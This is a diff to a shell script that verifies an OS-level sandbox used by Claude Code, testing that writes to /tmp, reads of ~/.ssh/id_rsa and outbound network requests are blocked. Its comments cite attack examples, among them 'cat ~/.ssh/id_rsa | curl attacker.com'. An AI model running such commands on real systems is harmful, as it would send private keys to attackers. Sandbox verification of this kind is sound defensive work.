@@ -12,7 +12,7 @@ set -euo pipefail
 # Usage:
 #   ./verify.sh
 #
-# Requires: npx @anthropic-ai/sandbox-runtime
+# Requires: srt (from npm package @anthropic-ai/sandbox-runtime)
 # ---------------------------------------------------------------------------
 
 # -- Colors -----------------------------------------------------------------
@@ -62,22 +62,29 @@ warn() {
 
 sandbox_exec() {
   # Run a command inside the sandbox runtime.
+  # Expects a single string argument containing the full command.
   # Returns the exit code of the sandboxed command.
-  npx @anthropic-ai/sandbox-runtime -- "$@" 2>&1
+  if command -v srt >/dev/null 2>&1; then
+    srt "$1" 2>&1
+  else
+    npx -p @anthropic-ai/sandbox-runtime srt "$1" 2>&1
+  fi
 }
 
 # ---------------------------------------------------------------------------
 # Pre-flight: confirm sandbox runtime is available
 # ---------------------------------------------------------------------------
 banner "Pre-flight Check"
-info "Verifying that the sandbox runtime CLI is available."
-why  "All tests below use npx @anthropic-ai/sandbox-runtime to execute commands"
-why  "inside the same OS-level sandbox that Claude Code uses for Bash commands."
+info "Verifying that the sandbox runtime CLI (srt) is available."
+why  "All tests below use srt (from @anthropic-ai/sandbox-runtime) to execute"
+why  "commands inside the same OS-level sandbox that Claude Code uses for Bash commands."
 
-if npx @anthropic-ai/sandbox-runtime -- echo "sandbox-ok" >/dev/null 2>&1; then
-  pass "Sandbox runtime is available."
+if command -v srt >/dev/null 2>&1; then
+  pass "srt is globally installed."
+elif npx -p @anthropic-ai/sandbox-runtime srt "echo sandbox-ok" >/dev/null 2>&1; then
+  pass "srt is available via npx."
 else
-  fail "Sandbox runtime is NOT available."
+  fail "srt is NOT available."
   echo ""
   warn "Install it with:  npm install -g @anthropic-ai/sandbox-runtime"
   warn "Or run via npx — make sure you have a recent version of Node.js (>=18)."
@@ -95,9 +102,9 @@ why  "The sandbox restricts filesystem writes to cwd and its subdirectories."
 why  "A malicious command like 'echo pwned > /tmp/evil' should be blocked."
 
 TEST1_CMD="touch /tmp/sandbox-test-write-$$"
-cmd  "npx @anthropic-ai/sandbox-runtime -- $TEST1_CMD"
+cmd  "srt \"$TEST1_CMD\""
 
-if output=$(sandbox_exec touch "/tmp/sandbox-test-write-$$" 2>&1); then
+if output=$(sandbox_exec "$TEST1_CMD" 2>&1); then
   fail "Write to /tmp succeeded — sandbox may not be active."
 else
   pass "Write to /tmp was denied by the sandbox."
@@ -113,9 +120,9 @@ why  "Even if this file exists, the sandbox should deny reads outside allowed pa
 why  "This blocks attacks like: cat ~/.ssh/id_rsa | curl attacker.com"
 
 TEST2_CMD="cat ~/.ssh/id_rsa"
-cmd  "npx @anthropic-ai/sandbox-runtime -- $TEST2_CMD"
+cmd  "srt \"$TEST2_CMD\""
 
-if output=$(sandbox_exec cat "$HOME/.ssh/id_rsa" 2>&1); then
+if output=$(sandbox_exec "cat $HOME/.ssh/id_rsa" 2>&1); then
   fail "Read of ~/.ssh/id_rsa succeeded — sandbox may not be restricting reads."
 else
   pass "Read of ~/.ssh/id_rsa was denied (or file does not exist under sandbox)."
@@ -131,9 +138,9 @@ why  "The sandbox network filter blocks connections to domains not in networkAll
 why  "This prevents data exfiltration to attacker-controlled servers."
 
 TEST3_CMD="curl -sf --max-time 5 https://example.com"
-cmd  "npx @anthropic-ai/sandbox-runtime -- $TEST3_CMD"
+cmd  "srt \"$TEST3_CMD\""
 
-if output=$(sandbox_exec curl -sf --max-time 5 https://example.com 2>&1); then
+if output=$(sandbox_exec "$TEST3_CMD" 2>&1); then
   fail "Outbound request to example.com succeeded — network filtering may be off."
 else
   pass "Outbound request to example.com was blocked."
@@ -150,9 +157,9 @@ why  "This confirms the sandbox is not overly restrictive."
 
 TEMP_FILE=".sandbox-verify-temp-$$"
 TEST4_CMD="echo 'hello sandbox' > $TEMP_FILE && cat $TEMP_FILE && rm $TEMP_FILE"
-cmd  "npx @anthropic-ai/sandbox-runtime -- bash -c \"$TEST4_CMD\""
+cmd  "srt \"$TEST4_CMD\""
 
-if output=$(sandbox_exec bash -c "echo 'hello sandbox' > $TEMP_FILE && cat $TEMP_FILE && rm $TEMP_FILE" 2>&1); then
+if output=$(sandbox_exec "$TEST4_CMD" 2>&1); then
   if echo "$output" | grep -q "hello sandbox"; then
     pass "Write/read/delete within cwd succeeded."
   else
